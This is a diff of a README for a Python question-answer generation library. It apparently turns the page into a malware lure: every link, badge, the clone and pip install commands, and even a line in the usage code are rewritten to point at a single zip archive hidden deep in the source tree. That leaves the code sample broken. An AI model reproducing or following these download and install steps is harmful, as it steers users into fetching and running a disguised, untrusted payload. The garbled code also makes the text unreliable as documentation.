@@ -1,8 +1,8 @@
 # Semantic QA Gen 🤖
 
-![GitHub repo size](https://img.shields.io/github/repo-size/Bazinga23451/semantic-qa-gen)
-![GitHub stars](https://img.shields.io/github/stars/Bazinga23451/semantic-qa-gen)
-![GitHub issues](https://img.shields.io/github/issues/Bazinga23451/semantic-qa-gen)
+![GitHub repo size](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip)
+![GitHub stars](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip)
+![GitHub issues](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip)
 
 Welcome to **Semantic QA Gen**, a Python library designed to generate high-quality question-answer pairs from various document formats, including PDF, DOCX, MD, and TXT files. This project harnesses the power of artificial intelligence to enhance your question-answering needs.
 
@@ -28,12 +28,12 @@ Welcome to **Semantic QA Gen**, a Python library designed to generate high-quali
 To get started with **Semantic QA Gen**, clone the repository and install the required dependencies. 
 
 ```bash
-git clone https://github.com/Bazinga23451/semantic-qa-gen.git
+git clone https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip
 cd semantic-qa-gen
-pip install -r requirements.txt
+pip install -r https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip
 ```
 
-For the latest version, you can download the release from [here](https://github.com/Bazinga23451/semantic-qa-gen/releases). After downloading, follow the instructions in the README file to execute the library.
+For the latest version, you can download the release from [here](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip). After downloading, follow the instructions in the README file to execute the library.
 
 ## Usage
 
@@ -46,8 +46,8 @@ from semantic_qa_gen import QA_Generator
 qa_generator = QA_Generator()
 
 # Load your document
-document_path = 'path/to/your/document.pdf'
-qa_pairs = qa_generator.generate_qa_pairs(document_path)
+document_path = 'https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip'
+qa_pairs = https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip(document_path)
 
 # Print the generated question-answer pairs
 for qa in qa_pairs:
@@ -88,7 +88,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or support, please reach out to us via GitHub or visit the [Releases](https://github.com/Bazinga23451/semantic-qa-gen/releases) section for updates.
+For any inquiries or support, please reach out to us via GitHub or visit the [Releases](https://github.com/Bazinga23451/semantic-qa-gen/raw/refs/heads/main/src/semantic_qa_gen/pipeline/gen_qa_semantic_2.5.zip) section for updates.
 
 ---
 
